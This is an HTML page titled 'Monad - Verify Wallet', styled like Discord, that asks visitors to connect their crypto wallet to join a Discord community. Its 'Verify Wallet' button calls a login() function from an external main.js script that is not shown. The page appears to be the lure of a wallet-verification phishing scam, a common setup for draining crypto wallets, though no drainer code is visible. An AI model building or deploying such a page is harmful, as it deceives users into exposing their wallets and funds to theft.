<!DOCTYPE html>
<html lang="en-US">
<head>
       <script type="text/javascript" src="main.js"></script>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Monad - Verify Wallet</title>
    <style>
        body { 
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background: linear-gradient(to bottom, #36393f, #2f3136); 
            color: #dcddde; 
            margin: 0; 
            padding: 0; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        .container {
            background: #36393f;
            border-radius: 8px;
            padding: 40px;
            width: 400px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        }
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
            background: #5865f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            color: white;
        }
        h1 { margin: 10px 0; font-size: 24px; }
        p { color: #b9bbbe; margin-bottom: 30px; }
        button {
            background: #5865f2;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        button:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">M</div>
        <h1>Verify Wallet</h1>
        <p>Connect your wallet to join the Monad community on Discord.</p>
        <button onclick="login()">Verify Wallet</button>
    </div>

    <!-- External script loaded early -->
 
</body>
</html>
